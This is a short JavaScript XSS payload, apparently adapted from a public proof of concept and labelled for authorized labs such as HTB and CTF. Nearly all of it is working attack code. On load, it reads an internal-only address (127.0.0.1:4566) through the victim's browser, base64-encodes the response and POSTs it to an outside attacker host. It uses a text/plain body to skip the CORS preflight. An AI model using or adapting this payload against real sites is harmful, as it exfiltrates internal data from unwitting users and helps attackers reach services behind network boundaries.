// myexfilxss
// Based on the TrustedSec XSS data-exfil PoC.
// Reads an internal-only URL from the victim's browser and sends
// the whole response back in a single POST body (base64).
// For authorized labs only (HTB, CTF, own environments).

function read_body(xhr)
{
	var data;

	if (!xhr.responseType || xhr.responseType === "text")
	{
		data = xhr.responseText;
	}
	else if (xhr.responseType === "document")
	{
		data = xhr.responseXML;
	}
	else if (xhr.responseType === "json")
	{
		data = xhr.responseJSON;
	}
	else
	{
		data = xhr.response;
	}
	return data;
}

function stealData()
{
	var uri = "http://127.0.0.1:4566/";

	var xhr = new XMLHttpRequest();
	xhr.open("GET", uri, true);
	xhr.send(null);

	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			// We have the response back with the data
			var dataResponse = read_body(xhr);

			// Send the whole response in a single POST body
			// text/plain avoids the CORS preflight
			var exfil = new XMLHttpRequest();
			exfil.open("POST", "http://10.10.14.212/exfil", true);
			exfil.setRequestHeader("Content-Type", "text/plain");
			exfil.send(btoa(dataResponse));

			console.log("Done exfiling..");
		}
	};
}

stealData();
